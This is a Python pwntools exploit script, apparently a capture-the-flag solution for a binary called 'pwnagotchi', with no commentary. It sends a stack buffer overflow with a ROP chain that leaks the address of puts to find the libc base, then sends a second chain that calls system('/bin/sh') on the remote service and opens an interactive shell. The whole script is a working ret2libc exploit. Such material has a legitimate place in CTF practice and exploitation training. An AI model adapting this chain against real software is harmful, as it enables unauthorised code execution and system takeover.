from pwn import *

elf = context.binary = ELF("./bin/pwnagotchi")

#r = process(elf.path)
r = remote("127.0.0.1", 5002)

context.log_level = "debug"

rop = ROP(elf)
rop.puts(elf.got["puts"])
rop.eat()
rop.zzz()
rop.main()

payload = ""
payload += "A" * 20
payload += str(rop)
r.sendlineafter("Enter your pwnagotchi's name: ", payload)

r.recvuntil("is not happy!\n")
puts_leak = u64(r.recvline().rstrip().ljust(8, "\x00"))
log.info("puts leak: {}".format(hex(puts_leak)))

libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
libc.address = puts_leak - libc.symbols["puts"]

rop = ROP(libc)
rop.raw(rop.find_gadget(["ret"]))
rop.system(next(libc.search("/bin/sh\x00")))

payload = ""
payload += "A" * 20
payload += str(rop)
r.sendlineafter("Enter your pwnagotchi's name: ", payload)

r.interactive()
